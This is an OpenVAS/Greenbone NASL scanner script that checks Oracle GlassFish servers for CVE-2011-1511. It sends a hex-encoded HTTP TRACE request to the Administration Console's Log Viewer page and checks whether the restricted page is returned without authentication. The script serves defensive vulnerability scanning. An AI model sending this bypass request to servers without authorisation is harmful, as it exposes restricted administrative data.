# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801939");
  script_version("2025-01-31T05:37:27+0000");
  script_tag(name:"last_modification", value:"2025-01-31 05:37:27 +0000 (Fri, 31 Jan 2025)");
  script_tag(name:"creation_date", value:"2011-05-26 10:47:46 +0200 (Thu, 26 May 2011)");
  script_cve_id("CVE-2011-1511");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
  script_name("Oracle Java GlassFish Server Security Bypass Vulnerability (May 2011)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 4848);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/May/296");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/101343/CORE-2010-1118.txt");

  script_tag(name:"impact", value:"Successful exploitation could allow local attackers to access
  sensitive data on the server without being authenticated, by making 'TRACE' requests against the
  Administration Console.");

  script_tag(name:"affected", value:"Oracle GlassFish version 3.0.1 and Sun GlassFish Enterprise
  Server version 2.1.1.");

  script_tag(name:"insight", value:"The flaw is due to an error in Administration Console, when
  handling HTTP requests using the 'TRACE' method. A remote unauthenticated attacker can get access
  to the content of restricted pages in the Administration Console.");

  script_tag(name:"solution", value:"Apply the security updates or update to Oracle GlassFish
  version 3.1 or later.");

  script_tag(name:"summary", value:"Oracle GlassFish Server is prone to a security bypass
  vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default:4848);

host = http_host_name(dont_add_port:TRUE);

res = http_get_cache(item:"/", port:port);

if("Sun Java System Application Server" >< res || "GlassFish Server" >< res){

  soc = open_sock_tcp(port);
  if(!soc)
    exit(0);

  data = raw_string (0x54, 0x52, 0x41, 0x43, 0x45, 0x20, 0x2f, 0x63,
                     0x6f, 0x6d, 0x6d, 0x6f, 0x6e, 0x2f, 0x6c, 0x6f,
                     0x67, 0x56, 0x69, 0x65, 0x77, 0x65, 0x72, 0x2f,
                     0x6c, 0x6f, 0x67, 0x56, 0x69, 0x65, 0x77, 0x65,
                     0x72, 0x2e, 0x6a, 0x73, 0x66, 0x20, 0x48, 0x54,
                     0x54, 0x50, 0x2f, 0x31, 0x2e, 0x31, 0x0d, 0x0a,
                     0x48, 0x6f, 0x73, 0x74, 0x3a) + host +
                     raw_string(0x3a) + port + raw_string(0x0d, 0x0a,
                     0x41, 0x63, 0x63, 0x65, 0x70, 0x74, 0x2d, 0x45,
                     0x6e, 0x63, 0x6f, 0x64, 0x69, 0x6e, 0x67, 0x3a,
                     0x20, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x69, 0x74,
                     0x79, 0x0d, 0x0a, 0x43, 0x6f, 0x6e, 0x6e, 0x65,
                     0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x20, 0x63,
                     0x6c, 0x6f, 0x73, 0x65, 0x0d, 0x0a, 0x0d, 0x0a);

  send(socket:soc, data:data);
  rcv = recv(socket:soc, length:1024);
  close(soc);

  if("<title>Log Viewer</title>" >< rcv && "405 TRACE method is not allowed" >!< rcv){
    security_message(port:port);
    exit(0);
  }
}

exit(99);
